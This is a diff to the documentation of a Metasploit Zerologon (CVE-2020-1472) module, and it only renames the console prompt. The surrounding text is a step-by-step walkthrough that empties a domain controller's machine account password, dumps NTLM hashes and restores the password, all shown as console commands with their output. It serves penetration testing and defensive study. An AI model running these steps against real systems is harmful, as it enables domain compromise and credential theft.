@@ -52,12 +52,12 @@ This value is only used when running the module with the `RESTORE` action.
 First, exploit the vulnerability to remove the machine account password by replacing it with an empty string.
 
 ```
-msf6 > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set RHOSTS 192.168.159.53 
+msf > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set RHOSTS 192.168.159.53 
 RHOSTS => 192.168.159.53
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set NBNAME WIN-GD5KVDKUNIP
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set NBNAME WIN-GD5KVDKUNIP
 NBNAME => WIN-GD5KVDKUNIP
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 
 
 Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):
 
@@ -75,7 +75,7 @@ Auxiliary action:
    REMOVE  Remove the machine account password
 
 
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
 [*] Running module against 192.168.159.53
 
 [*] 192.168.159.53: - Connecting to the endpoint mapper service...
@@ -84,7 +84,7 @@ msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
 [+] 192.168.159.53:6403 - Successfully authenticated
 [+] 192.168.159.53:6403 - Successfully set the machine account (WIN-GD5KVDKUNIP$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
 ```
 
 At this point the `exploit/windows/smb/psexec` module can be used to achieve code execution if desired. Set the `SMBUser` option to the
@@ -94,14 +94,14 @@ Next, recover the original machine account password value using `auxiliary/gathe
 value in the `$MACHINE.ACC` section.
 
 ```
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > use auxiliary/gather/windows_secrets_dump 
-msf6 auxiliary(gather/windows_secrets_dump) > set RHOSTS 192.168.159.53
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > use auxiliary/gather/windows_secrets_dump 
+msf auxiliary(gather/windows_secrets_dump) > set RHOSTS 192.168.159.53
 RHOSTS => 192.168.159.53
-msf6 auxiliary(gather/windows_secrets_dump) > set SMBUser WIN-GD5KVDKUNIP$
+msf auxiliary(gather/windows_secrets_dump) > set SMBUser WIN-GD5KVDKUNIP$
 SMBUser => WIN-GD5KVDKUNIP$
-msf6 auxiliary(gather/windows_secrets_dump) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf auxiliary(gather/windows_secrets_dump) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-msf6 auxiliary(gather/windows_secrets_dump) > run
+msf auxiliary(gather/windows_secrets_dump) > run
 [*] Running module against 192.168.159.53
 
 [*] 192.168.159.53:445 - Service RemoteRegistry is already running
@@ -131,18 +131,18 @@ EXCHG\WIN-GD5KVDKUNIP$:aad3b435b51404eeaad3b435b51404ee:ec3a7fa2158f1f705898d538
 No cached hashes on this system
 [*] 192.168.159.53:445 - Cleaning up...
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/windows_secrets_dump) >
+msf auxiliary(gather/windows_secrets_dump) >
 ```
 
 Finally, restore the original value using this module.
 
 ```
-msf6 auxiliary(gather/windows_secrets_dump) > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set ACTION RESTORE 
+msf auxiliary(gather/windows_secrets_dump) > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set ACTION RESTORE 
 ACTION => RESTORE
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
 PASSWORD => 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 
 
 Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):
 
@@ -161,7 +161,7 @@ Auxiliary action:
    RESTORE  Restore the machine account password
 
 
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
 [*] Running module against 192.168.159.53
 
 [*] 192.168.159.53: - Connecting to the endpoint mapper service...
@@ -169,5 +169,5 @@ msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
 [*] 192.168.159.53:6403 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.53[6403] ...
 [+] 192.168.159.53:6403 - Successfully set machine account (WIN-GD5KVDKUNIP$) password
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
+msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
 ```
